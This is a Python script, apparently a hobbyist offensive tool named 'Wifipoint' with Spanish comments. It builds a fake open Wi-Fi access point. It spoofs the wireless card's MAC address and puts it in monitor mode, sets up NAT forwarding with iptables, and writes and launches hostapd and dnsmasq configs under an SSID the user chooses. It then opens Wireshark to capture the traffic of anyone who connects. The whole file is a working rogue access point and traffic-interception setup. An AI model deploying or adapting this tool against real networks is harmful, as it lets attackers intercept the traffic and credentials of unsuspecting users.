#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
import time
import sys
import os
import subprocess 
from subprocess import Popen, PIPE, STDOUT
from io import open
import threading


# Programador David soto noche
# Correo: Sotodelanoche@gmail.com
# Lenguaje Python3 scrispt 
# Fecha 08:05:2021:
# Nombre del programa : Wifipoint
# Accion Acceso falso wifi 

#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
os.system('clear')
os.system('python3 /root/herramientas/wifi/wifi_point/img2txt/img2txt.py /root/herramientas/wifi/wifi_point/logo.jpeg --ansi --maxLen=60 --targetAspect=0,1 --color')
print("\033[1;31;1m ")
os.system('figlet .FaKe PoiNt WL.')
print("				Smp_A")
print("\033[1;37;1m ")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

listamenu=["opciones:","1--seleccion Wlan", "2--hostapd ","3--dnsmasq","4--wireshark","5--Exit","Selec options: "]#Menu Princcipal

key=0
exit=False

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def menu():
	print("     "+listamenu[0])
	print(listamenu[1])
	print(listamenu[2])
	print(listamenu[3])
	print(listamenu[4])
	print(listamenu[5])

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Funcion principal $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Funcion  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

def config_general():
	while True:
		try:
			global wlan
			global name_Wifi
			global channel
			global banda
			os.system("ifconfig")
			wlan=input("Input name Wlan: ")
			name_Wifi=input("Input Name Fake point Wifi: ")
			channel=input("Input channel: ")
			banda=input("Input banda the working G/A/B/N: ")
			return wlan,name_Wifi,channel,banda
			break
		except TypeError:
			MessageBox.showerror("Ha ocurrido un error inesperado.")

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Funcion principal $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Funcion wifi ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

def config_wlan(wlan):

	if(wlan=="wlan0mon" or wlan=="wlan1mon"):
		wlan=wlan
	else:
		print("Procesando wlan0")
		os.system('ifconfig '+wlan+' down')
		os.system('macchanger -A '+wlan)
		os.system('ifconfig '+wlan+' up') 
		os.system('airmon-ng start '+wlan)
		os.system('airmon-ng check '+wlan)
		return wlan

def config_route_tables():
	os.system('ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0')
	time.sleep(0.3)
	os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')
	time.sleep(0.3)
	os.system('iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE')
	time.sleep(0.3)
	os.system('iptables --append FORWARD --in-interface wlan0mon -j ACCEPT')
	time.sleep(0.3)
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	time.sleep(0.3)
	os.system('iptables -t nat -L')
	
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION DE ARCHIVOS CONF $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ hostapd ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

def hostapd(wlan,name_Wifi,banda,channel):

	configurar_Hostapd=threading.Thread(target=configurar_hostapd, args=(wlan,name_Wifi,banda,channel,))
	configurar_Hostapd.start()

def configurar_hostapd(wlan,name_Wifi,banda,channel, **datos):
	os.system('touch hostapd.conf')
	file1 = open("hostapd.conf","w")
	time.sleep(0.3)
	file1.write('interface='+wlan+'mon'+'\n')
	file1.write('driver=nl80211'+'\n')
	file1.write('ssid='+name_Wifi+'\n')
	file1.write('hw_mode='+banda+'\n')
	file1.write('channel='+channel+'\n')
	file1.write('macaddr_acl=0'+'\n')
	file1.write('auth_algs=1'+'\n')
	file1.write('ignore_broadcast_ssid=0'+'\n')
	file1.close()
	time.sleep(1)
	process=Popen(['x-terminal-emulator', '-e', 'hostapd', 'hostapd.conf'], stdout=PIPE, stderr=PIPE, shell=False)
	stdout, stderr = process.communicate()

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$  CONFIGURACION DE ARCHIVOS CONF $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ dnsmasq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

def dnsmasq(wlan):

	configurar_Dnsmasq=threading.Thread(target=configurar_dnsmasq, args=(wlan,))
	configurar_Dnsmasq.start()

def configurar_dnsmasq(wlan, **datos):
	os.system('touch dnsmasq.conf')
	time.sleep(0.3)
	file2 = open("dnsmasq.conf","w")
	file2.write('interface='+wlan+'mon'+'\n')
	file2.write('dhcp-range=192.168.1.1,192.168.1.24,255.255.255.0,1h'+'\n')
	file2.write('dhcp-option=3,192.168.1.1'+'\n')
	file2.write('dhcp-option=6,192.168.1.1'+'\n')
	file2.write('server=8.8.8.8'+'\n')
	file2.write('log-queries'+'\n')
	file2.write('log-dhcp'+'\n')
	file2.write('listen-address=127.0.0.1'+'\n')
	file2.close()
	time.sleep(1)
	process1=Popen(['x-terminal-emulator', '-e', 'dnsmasq', '-C', 'dnsmasq.conf', '-d'], stdout=PIPE, stderr=PIPE, shell=False)
	stdout, stderr = process1.communicate()		

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU DE EJECUCION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

while exit==False:

	menu()
	key=(int(input()))
	
	if (key==1):
		config_general()
		config_wlan(wlan)
		config_route_tables()
	elif (key==2):	
		hostapd(wlan,name_Wifi,banda,channel)
	elif (key==3):
		dnsmasq(wlan)
	elif (key==4):
		os.system('wireshark')
	elif (key==5):
		os.system('airmon-ng stop wlan0mon')
		os.system('ifconfig wlan0 down')
		os.system('iwconfig wlan0 mode managed')
		os.system('ifconfig wlan0 up')
		os.system('service NetworkManager start')
		os.system('iptables -F')
		os.system('systemctl stop hostapd')
		os.system('dnsmasq stop')
		os.system('rm hostapd.conf')
		os.system('rm dnsmasq.conf')
		exit=True	
